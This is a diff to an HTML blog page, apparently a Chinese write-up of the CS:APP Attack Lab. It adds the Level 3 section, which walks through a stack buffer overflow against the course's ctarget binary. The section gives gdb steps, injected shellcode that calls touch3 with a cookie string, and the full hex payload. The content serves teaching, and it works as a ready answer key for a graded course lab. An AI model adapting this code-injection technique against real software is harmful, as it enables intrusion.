@@ -94,7 +94,7 @@ window.onload = wrap_img;
        • <span class="read-time" title="Estimated read time">
     
     
-      4 min read
+      5 min read
     
 </span></p>
 
@@ -136,9 +136,9 @@ window.onload = wrap_img;
 <ul>
 <li class="toc-entry toc-h4"><a href="#0x11-level-1">0x1.1 Level 1</a></li>
 <li class="toc-entry toc-h4"><a href="#0x12-level-2">0x1.2 Level 2</a></li>
-<li class="toc-entry toc-h4"><a href="#0x13-level-3">0x1.3 Level 3</a></li>
 </ul>
 </li>
+<li class="toc-entry toc-h3"><a href="#0x13-level-3">0x1.3 Level 3</a></li>
 <li class="toc-entry toc-h3"><a href="#0x2-return-oriented-programming">0x2 Return-Oriented Programming</a>
 <ul>
 <li class="toc-entry toc-h4"><a href="#0x21-level-4">0x2.1 Level 4</a></li>
@@ -410,8 +410,58 @@ Valid solution <span class="k">for </span>level 2 with target ctarget
 PASS: Would have posted the following:
 </code></pre></div></div>
 
-<h4 id="0x13-level-3">
-<a class="anchor" href="#0x13-level-3" aria-hidden="true"><span class="octicon octicon-link"></span></a>0x1.3 Level 3</h4>
+<h3 id="0x13-level-3">
+<a class="anchor" href="#0x13-level-3" aria-hidden="true"><span class="octicon octicon-link"></span></a>0x1.3 Level 3</h3>
+
+<p><code class="language-plaintext highlighter-rouge">sval</code> 就是需要我们传入的参数，<code class="language-plaintext highlighter-rouge">cookie</code> 是需要比较的内容，可以先找到 <code class="language-plaintext highlighter-rouge">touch3</code> 函数的地址是 <code class="language-plaintext highlighter-rouge">0x4018fa</code>，先使用 <code class="language-plaintext highlighter-rouge">gdb</code>在 <code class="language-plaintext highlighter-rouge">touch3</code> 的入口打上断点，然后按照 level1 的做法，让程序在 <code class="language-plaintext highlighter-rouge">return</code> 之后跳转到 <code class="language-plaintext highlighter-rouge">touch3</code>，接着单步运行，到执行 <code class="language-plaintext highlighter-rouge">hexmatch</code> 函数之前，这个时候可以通过下面的方式访问需要的字符串以及他们对应的 16 进制数字</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">(</span><span class="nx">gdb</span><span class="p">)</span> <span class="nx">x</span><span class="o">/</span><span class="nx">s</span> <span class="mh">0x6044e4</span>
+<span class="mh">0x6044e4</span> <span class="o">&lt;</span><span class="nx">cookie</span><span class="o">&gt;</span><span class="p">:</span>      <span class="dl">"</span><span class="se">\</span><span class="s2">372</span><span class="se">\</span><span class="s2">227</span><span class="se">\</span><span class="s2">271Y</span><span class="dl">"</span>
+<span class="p">(</span><span class="nx">gdb</span><span class="p">)</span> <span class="nx">p</span><span class="o">/</span><span class="nx">x</span> <span class="dl">"</span><span class="se">\</span><span class="s2">372</span><span class="se">\</span><span class="s2">227</span><span class="se">\</span><span class="s2">271Y</span><span class="dl">"</span>
+<span class="nx">$3</span> <span class="o">=</span> <span class="p">{</span><span class="mh">0xfa</span><span class="p">,</span> <span class="mh">0x97</span><span class="p">,</span> <span class="mh">0xb9</span><span class="p">,</span> <span class="mh">0x59</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">}</span>
+</code></pre></div></div>
+
+<p>接着再将这里的16进制数字转换成 <code class="language-plaintext highlighter-rouge">anscii</code> 码，比如 <code class="language-plaintext highlighter-rouge">f</code> 对应 <code class="language-plaintext highlighter-rouge">0x66</code>，以此转换即可得到需要写入的 16 进制数字。</p>
+
+<p>在获得了需要输入的字符串之后，我们可以仿照 level2 进行数据的插入，不过需要思考一个问题，那就是在调用 <code class="language-plaintext highlighter-rouge">hexmatch</code> 这个函数的时候，会有压栈的操作，如果保存的数据在栈里面，有可能会被覆盖。</p>
+
+<p>我们可以查看 <code class="language-plaintext highlighter-rouge">hexmatch</code> 的代码，发现在压栈的时候，有下面这行代码</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">401850</span><span class="p">:</span>	<span class="mi">48</span> <span class="mi">83</span> <span class="nx">c4</span> <span class="mi">80</span>   <span class="nx">add</span>    <span class="nx">$0xffffffffffffff80</span><span class="p">,</span><span class="o">%</span><span class="nx">rsp</span>
+</code></pre></div></div>
+
+<p>将上面的立即数翻译成一个有符号的正数，结果就是 <code class="language-plaintext highlighter-rouge">-128</code>，所以栈顶会减小 128 个字节，如果将数据放在这里，会出现覆盖的风险，应该将字符串放在 <code class="language-plaintext highlighter-rouge">$rsp</code> 最大的位置。</p>
+
+<p>可以通过打断点，在 <code class="language-plaintext highlighter-rouge">getbuf</code> 的 <code class="language-plaintext highlighter-rouge">retq</code> 停下来，然后通过 <code class="language-plaintext highlighter-rouge">p/x $rsp</code> 获得目前栈顶的地址是 <code class="language-plaintext highlighter-rouge">0x5561dca0</code>，接着会执行 <code class="language-plaintext highlighter-rouge">retq</code> 操作，这样栈顶会增加 8，这就是整个程序运行过程中的最大栈顶地址，我们可以在这里写入需要传到 <code class="language-plaintext highlighter-rouge">touch3</code> 中的字符串，那么这里的地址就是 <code class="language-plaintext highlighter-rouge">0x5561dca8</code>，所以最终我们插入的可执行代码为</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">pushq</span> <span class="nx">$0x4018fa</span>
+<span class="nx">movq</span> <span class="nx">$0x5561dca8</span><span class="p">,</span><span class="o">%</span><span class="nx">rdi</span>
+<span class="nx">retq</span>
+</code></pre></div></div>
+
+<p>接着仿照 level2 的做法可以获得这段可执行代码的字节码如下</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">0000000000000000</span> <span class="o">&lt;</span><span class="p">.</span><span class="nx">text</span><span class="o">&gt;</span><span class="p">:</span>
+   <span class="mi">0</span><span class="p">:</span>	<span class="mi">68</span> <span class="nx">fa</span> <span class="mi">18</span> <span class="mi">40</span> <span class="mi">00</span>       	<span class="nx">pushq</span>  <span class="nx">$0x4018fa</span>
+   <span class="mi">5</span><span class="p">:</span>	<span class="mi">48</span> <span class="nx">c7</span> <span class="nx">c7</span> <span class="nx">a8</span> <span class="nx">dc</span> <span class="mi">61</span> <span class="mi">55</span> 	<span class="nx">mov</span>    <span class="nx">$0x5561dca8</span><span class="p">,</span><span class="o">%</span><span class="nx">rdi</span>
+   <span class="nx">c</span><span class="p">:</span>	<span class="nx">c3</span>                   	<span class="nx">retq</span>   
+</code></pre></div></div>
+
+<p>所以最后我们要写入的 txt 文本为</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">68</span> <span class="nx">fa</span> <span class="mi">18</span> <span class="mi">40</span> <span class="mi">00</span>
+<span class="mi">48</span> <span class="nx">c7</span> <span class="nx">c7</span> <span class="nx">a8</span> <span class="nx">dc</span> <span class="mi">61</span> <span class="mi">55</span>
+<span class="nx">c3</span>
+<span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>
+<span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> 
+<span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> 
+<span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> 
+<span class="mi">78</span> <span class="nx">dc</span> <span class="mi">61</span> <span class="mi">55</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>
+<span class="mi">35</span> <span class="mi">39</span> <span class="mi">62</span> <span class="mi">39</span> <span class="mi">39</span> <span class="mi">37</span> <span class="mi">66</span> <span class="mi">61</span> <span class="mi">00</span>
+</code></pre></div></div>
+
+<p>最顶上是可执行代码，接着中间是占位符，然后填入执行代码的地址是 <code class="language-plaintext highlighter-rouge">0x5561dc78</code>，在最后输入字符串对应的 <code class="language-plaintext highlighter-rouge">anscii</code> 码。
+注意字符串从内存中读取的时候，是按地址从小到大进行读取的，但是在写入字符串的时候却是从大到小，所以这里需要颠倒一下顺序。</p>
 
 <h3 id="0x2-return-oriented-programming">
 <a class="anchor" href="#0x2-return-oriented-programming" aria-hidden="true"><span class="octicon octicon-link"></span></a>0x2 Return-Oriented Programming</h3>
